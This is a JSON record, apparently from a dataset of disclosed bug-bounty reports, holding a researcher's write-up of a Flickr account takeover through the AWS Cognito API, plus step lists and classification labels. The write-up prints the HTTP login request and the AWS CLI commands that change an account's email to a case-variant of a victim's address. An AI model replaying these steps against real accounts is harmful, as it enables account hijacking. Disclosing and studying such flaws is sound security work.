@@ -1,0 +1,52 @@
+{
+    "reported_to": "Flickr",
+    "reported_by": "lauritz ",
+    "title": "Flickr Account Takeover using AWS Cognito API",
+    "content": "\nFlickr uses Amazon Cognito to implement its login functionality.\nFurthermore, Flickr does not allow users to change their registered e-mail address via the user interface. This restriction can be bypassed via direct communication with the Amazon Cognito User Pool API.\nConsider we have the following accounts:\nflickr-benign@lauritz-holtmann.de (our victim)\nAn arbitrary other account that is controlled by the attacker - in the following flickr-attacker@lauritz-holtmann.de\nAt first, the malicious actor needs to obtain an Amazon access_token. To do so, intercept the login request that is sent from https://identity.flickr.com/:\nCode 389 Bytes\n1POST / HTTP/2\n2Host: cognito-idp.us-east-1.amazonaws.com\n3[...]\n4\n5{\n6    \"AuthFlow\":\"USER_PASSWORD_AUTH\",\n7    \"ClientId\":\"3ck15a1ov4f0d3o97vs3tbjb52\",\n8    \"AuthParameters\":{\n9        \"USERNAME\":\"flickr-attacker@lauritz-holtmann.de\",\n10        \"PASSWORD\":\"[REDACTED]\",\n11        \"DEVICE_KEY\":\"us-east-1_07032954-25bf-4781-b596-9d675d901072\"\n12    },\n13    \"ClientMetadata\":\n14    {                \n15    }\n16}\nIf the provided credentials for the attacker controlled account are valid, Amazon responds with tokens:\nCode 352 Bytes\n1HTTP/2 200 OK\n2Date: Thu, 16 Sep 2021 22:51:36 GMT\n3[...]\n4\n5{\n6    \"AuthenticationResult\":    \n7        {\n8            \"AccessToken\":\"[REDACTED]\",\n9            \"ExpiresIn\":3600,\n10            \"IdToken\":\"[REDACTED]\",\n11            \"RefreshToken\":\"[REDACTED]\",\n12            \"TokenType\":\"Bearer\"\n13        },\n14    \"ChallengeParameters\":\n15        {            \n16        }\n17}\nThe access_token can be directly used against Amazon's AWS API, for instance using the AWS Command Line Interface tool:\nCode 760 Bytes\n1$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]\n2{\n3    \"Username\": \"e28c344[...]\",\n4    \"UserAttributes\": [\n5        {\n6            \"Name\": \"sub\",\n7            \"Value\": \"e28[...]\"\n8        },\n9        {\n10            \"Name\": \"birthdate\",\n11            \"Value\": \"1998-09-17\"\n12        },\n13        {\n14            \"Name\": \"email_verified\",\n15            \"Value\": \"true\"\n16        },\n17        {\n18            \"Name\": \"locale\",\n19            \"Value\": \"en-us\"\n20        },\n21        {\n22            \"Name\": \"given_name\",\n23            \"Value\": \"Axel\"\n24        },\n25        {\n26            \"Name\": \"family_name\",\n27            \"Value\": \"Attacker\"\n28        },\n29        {\n30            \"Name\": \"email\",\n31            \"Value\": \"flickr-attacker@lauritz-holtmann.de\"\n32        }\n33    ]\n34}\nUsing the API, one is able to alter some of the user attributes - including the linked e-mail address:\nCode 338 Bytes\n1$ aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=flickr-Benign@lauritz-holtmann.de\n2{\n3    \"CodeDeliveryDetailsList\": [\n4        {\n5            \"Destination\": \"f***@l***.de\",\n6            \"DeliveryMedium\": \"EMAIL\",\n7            \"AttributeName\": \"email\"\n8        }\n9    ]\n10}\nNote that the registered address is case sensitive.\nAs the above output already indicates, at this stage, the e-mail address is not verified:\nCode 752 Bytes\n1$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQi[...] \n2{\n3    \"Username\": \"e28c34[...]\",\n4    \"UserAttributes\": [\n5        {\n6            \"Name\": \"sub\",\n7            \"Value\": \"e2[...]\"\n8        },\n9        {\n10            \"Name\": \"birthdate\",\n11            \"Value\": \"1998-09-17\"\n12        },\n13        {\n14            \"Name\": \"email_verified\",\n15            \"Value\": \"false\"\n16        },\n17        {\n18            \"Name\": \"locale\",\n19            \"Value\": \"en-us\"\n20        },\n21        {\n22            \"Name\": \"given_name\",\n23            \"Value\": \"Axel\"\n24        },\n25        {\n26            \"Name\": \"family_name\",\n27            \"Value\": \"Attacker\"\n28        },\n29        {\n30            \"Name\": \"email\",\n31            \"Value\": \"flickr-Benign@lauritz-holtmann.de\"\n32        }\n33    ]\n34}\nConclusion\nThe aforementioned behavior can be tracked down to the following root issues\n1) Flickr does not expect e-mail addresses to be changed - still it is possible to change a user's address using the AWS Cognito API.\n2) Flickr does not check whether the e-mail address is verified on login\n3) Flickr normalizes the e-mail address received from AWS cognito, so that collisions are possible\nImpact\nChained as shown above, the aforementioned vulnerabilities can be used to takeover a user's account without any user interaction.\nA malicious solely needs to know the e-mail address that is linked within a victim's account to link a crafted e-mail address to their account that can then be used to takeover the victim's account.\nFurther Notices\nAll tests were performed against my user accounts. The user account patterns used were as follows:\nlauritz+*@wearehackerone.com\n*@lauritz-holtmann.de\nPlease let me know if you have any comments or questions.\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": 50,
+    "weaknesses": [
+        "Improper Authentication - Generic"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1639805700,
+    "report_url": "https://hackerone.com/reports/1342088",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "HIGH",
+    "vuln_category": "API",
+    "steps": [
+        [
+            1,
+            "Intercept the login request from https://identity.flickr.com/ to obtain an access_token for an attacker-controlled account."
+        ],
+        [
+            2,
+            "Use the obtained access_token to call the AWS Cognito API to change the email address of the attacker-controlled account to match the victim's email address (case-sensitive)."
+        ],
+        [
+            3,
+            "Observe that the email address is not verified, but Flickr does not check for verification on login, allowing the attacker to take over the victim's account."
+        ]
+    ],
+    "vuln_description": "The vulnerability allows an attacker to take over a victim's Flickr account by exploiting the ability to change the email address via the AWS Cognito API without proper verification checks. The attacker can set their account's email to match the victim's (case-sensitive), and since Flickr does not verify the email on login, the attacker gains access to the victim's account.",
+    "reason": "The attack involves multiple components (intercepting login requests, using AWS Cognito API, understanding email normalization) and requires knowledge of how Flickr handles email verification. The interaction between these components is subtle, as the attacker must recognize that Flickr does not enforce email verification on login despite allowing email changes via the API.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "idor_detectable": false,
+    "authnz_byppass_detectable": true,
+    "is_simple_payload": false,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "idor_detectable": false,
+        "authnz_byppass_detectable": true
+    }
+}
